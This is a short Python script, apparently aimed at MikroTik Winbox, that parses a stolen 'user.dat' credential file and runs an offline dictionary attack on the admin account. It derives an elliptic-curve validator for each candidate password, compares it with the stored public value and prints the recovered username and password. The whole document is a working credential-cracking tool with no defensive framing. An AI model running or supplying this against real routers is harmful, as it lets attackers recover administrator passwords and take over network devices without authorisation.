import elliptic_curves
from winbox_server import parse_userdat

username = 'admin'

users = parse_userdat('user.dat')

salt, x_gamma = users[username]
x_gamma_1 = x_gamma[:-1]

with open('dictionary.txt', 'r') as f:
    passwords = f.readlines()

w = elliptic_curves.WCurve()

for password in passwords:
    password = password[:-1]
    i = w.gen_password_validator_priv(username, password, salt)
    x_gamma_2 = w.gen_public_key(i)[0]

    if x_gamma_1 == x_gamma_2:
        print(f'{username}:{password}')
        break
